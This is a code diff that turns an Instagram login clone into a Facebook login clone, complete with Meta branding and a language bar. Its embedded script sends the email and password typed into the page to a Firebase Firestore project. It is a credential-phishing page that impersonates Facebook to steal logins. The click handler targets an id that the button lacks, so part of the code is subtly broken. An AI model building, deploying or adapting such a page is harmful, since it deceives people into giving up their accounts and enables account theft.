@@ -4,56 +4,56 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="styles.css" />
-    <title>Nikki</title>
+    <link rel="stylesheet" href="style.css" />
+    <title>jatin_baba00</title>
   </head>
   <body>
-    <section class="instaSection">
-      <img class="imgInsta" src="./utils/instagram.png" />
-    </section>
-    <section class="fbButton">
-      <button class="contWithFB">
-        <img class="imgFb" src="./utils/fb.png" />Continue with Facebook
-      </button>
-    </section>
-    <section class="or">
-      <hr style="margin-top: 6%; width: 30%" />
-    </section>
-    <section class="et">
+    <div class="logo">
+      <img class="fb" src="./facebook.png" />
+    </div>
+    <div class="details">
       <input
-        class="email"
-        id="name"
-        type="text"
-        placeholder="Phone number, username, or email"
+        type="email"
+        name="email"
+        id="email"
+        placeholder="Mobile number or email address"
       />
-      <input
-        class="password"
-        id="pass"
-        type="password"
-        placeholder="Password"
-      />
-    </section>
-    <section class="forgotPassword">
-      <section class="forgotPass">
-        <div class="forgotText">Forgot password?</div>
-      </section>
-    </section>
-    <section class="login">
-      <button class="btnLogin" id="loginBtn">Log in</button>
-    </section>
-    <section class="signup">
-      <p>Don't have an account?</p>
-      <p class="btnSignup">Sign up</p>
-    </section>
-    <section class="footer">
-      <hr />
-      <p>from</p>
-      <img class="imgMeta" src="./utils/meta.png" />
-    </section>
+      <input type="text" name="password" id="pass" placeholder="Password" />
+    </div>
+    <div class="login">
+      <button class="btnLogin">Log In</button>
+    </div>
+    <div class="forgotPass">
+      <p>Forgotten password?</p>
+    </div>
+    <div class="or">
+      <hr class="first" />
+      <p id="or">or</p>
+      <hr class="second" />
+    </div>
+    <div class="create">
+      <button class="btnCreate">Create New Account</button>
+    </div>
+    <div class="languages">
+      <div class="firstPart">
+        <p class="english">English (UK)</p>
+        <p class="pubjabi">ਪੰਜਾਬੀ</p>
+        <p class="gujrati">ગુજરાતી</p>
+        <p class="tamil">தமிழ்</p>
+      </div>
+      <div class="secondPart">
+        <p class="hindi">हिन्दी</p>
+        <p class="urdu">اردو</p>
+        <p class="baangla">বাংলা</p>
+      </div>
+    </div>
+    <div class="meta">
+      <p>Meta © 2022</p>
+    </div>
 
     <script type="module">
       // Import the functions you need from the SDKs you need
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js";
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.13.0/firebase-app.js";
       // TODO: Add SDKs for Firebase products that you want to use
       // https://firebase.google.com/docs/web/setup#available-libraries
 
@@ -64,7 +64,7 @@
         projectId: "nikki-df8e6",
         storageBucket: "nikki-df8e6.appspot.com",
         messagingSenderId: "821183358972",
-        appId: "1:821183358972:web:68833f2853d9cfad077479",
+        appId: "1:821183358972:web:30fdf336d2edd308077479",
       };
 
       // Initialize Firebase
@@ -79,7 +79,7 @@
 
       const db = getFirestore();
 
-      var name = document.getElementById("name");
+      var name = document.getElementById("email");
       var pass = document.getElementById("pass");
 
       async function AddDocument_AutoID() {
@@ -93,7 +93,7 @@
       }
 
       document
-        .getElementById("loginBtn")
+        .getElementById("btnLogin")
         .addEventListener("click", AddDocument_AutoID);
     </script>
   </body>
